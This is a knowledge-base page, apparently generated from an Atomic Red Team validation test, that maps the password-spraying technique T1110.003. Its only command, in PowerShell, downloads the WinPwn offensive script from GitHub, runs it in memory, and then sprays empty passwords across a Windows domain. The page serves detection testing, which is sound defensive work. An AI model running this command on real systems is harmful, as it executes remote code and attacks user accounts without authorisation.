---
atomic_guid: "5ccf4bbd-7bf6-43fc-83ac-d9e38aff1d82"
title: "WinPwn - DomainPasswordSpray Attacks"
framework: "atomic"
generated: "true"
attack_technique_id: "T1110.003"
attack_technique_name: "Brute Force: Password Spraying"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/T1110.003.yaml"
build_date: "2026-04-27 19:12:27"
executor: "powershell"
aliases:
  - "5ccf4bbd-7bf6-43fc-83ac-d9e38aff1d82"
  - "WinPwn - DomainPasswordSpray Attacks"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

DomainPasswordSpray Attacks technique via function of WinPwn

## ATT&CK Mapping

- [[kb/attack/techniques/T1110-brute_force#^t1110003-password-spraying|T1110.003: Password Spraying]]

## Executor

- name: powershell

### Command

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
domainpassspray -consoleoutput -noninteractive -emptypasswords
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/T1110.003.yaml)
